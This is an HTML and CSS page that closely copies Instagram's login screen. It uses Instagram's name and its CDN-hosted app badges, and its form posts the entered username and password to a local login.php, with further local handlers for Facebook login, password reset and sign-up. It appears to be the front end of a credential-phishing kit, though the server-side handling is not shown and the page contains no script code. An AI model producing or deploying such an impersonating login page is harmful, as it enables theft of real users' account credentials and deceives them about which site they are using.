<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            display: flex;
            flex-direction: column;
            gap: 10px;
            width: 100%;
            max-width: 350px;
        }

        .box {
            background-color: #000;
            border: 1px solid #262626;
            padding: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            font-family: 'Brush Script MT', cursive;
            font-size: 48px;
            margin-bottom: 30px;
            font-weight: 400;
        }

        .tagline {
            text-align: center;
            color: #a8a8a8;
            font-size: 17px;
            font-weight: 600;
            margin-bottom: 20px;
            line-height: 20px;
        }

        input {
            width: 100%;
            padding: 9px 8px;
            margin-bottom: 6px;
            background-color: #121212;
            border: 1px solid #262626;
            border-radius: 3px;
            color: #fff;
            font-size: 12px;
            outline: none;
        }

        input::placeholder {
            color: #8e8e8e;
        }

        input:focus {
            border-color: #555;
        }

        .btn {
            width: 100%;
            padding: 8px;
            background-color: #4d91ef;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 8px;
        }

        .btn:hover {
            background-color: #3b7dd6;
        }

        .divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 20px 0 18px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #262626;
        }

        .divider span {
            padding: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #4d91ef;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            margin-bottom: 20px;
        }

        .fb-icon {
            width: 16px;
            height: 16px;
            background-color: #4d91ef;
            border-radius: 2px;
            display: inline-block;
        }

        .forgot-password {
            color: #a8a8a8;
            font-size: 12px;
            text-decoration: none;
        }

        .forgot-password:hover {
            color: #fff;
        }

        .signup-box {
            background-color: #000;
            border: 1px solid #262626;
            padding: 25px 40px;
            text-align: center;
            font-size: 14px;
        }

        .signup-box a {
            color: #4d91ef;
            font-weight: 600;
            text-decoration: none;
        }

        .signup-box a:hover {
            color: #3b7dd6;
        }

        .get-app {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }

        .app-buttons {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin-top: 15px;
        }

        .app-btn {
            height: 40px;
            cursor: pointer;
        }

        .info-text {
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
            line-height: 16px;
            margin: 10px 0;
        }

        .info-text a {
            color: #d7dbdf;
            text-decoration: none;
        }

        .info-text a:hover {
            text-decoration: underline;
        }

        .terms {
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
            line-height: 16px;
            margin-bottom: 20px;
        }

        .terms a {
            color: #d7dbdf;
            text-decoration: none;
        }

        .terms a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="box">
            <div class="logo">Instagram</div>
            
            <form method="POST" action="login.php" style="width: 100%;">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                
                <button type="submit" class="btn">Log in</button>
            </form>
            
            <div class="divider">
                <span>OR</span>
            </div>
            
            <a href="facebook-login.php" class="fb-login">
                <span class="fb-icon"></span>
                Log in with Facebook
            </a>
            
            <a href="forgot-password.php" class="forgot-password">Forgot password?</a>
        </div>
        
        <div class="signup-box">
            Don't have an account? <a href="instsignup.php">Sign up</a>
        </div>
        
        <div class="get-app">Get the app.</div>
        <div class="app-buttons">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play" class="app-btn">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft" class="app-btn">
        </div>
    </div>
</body>
</html>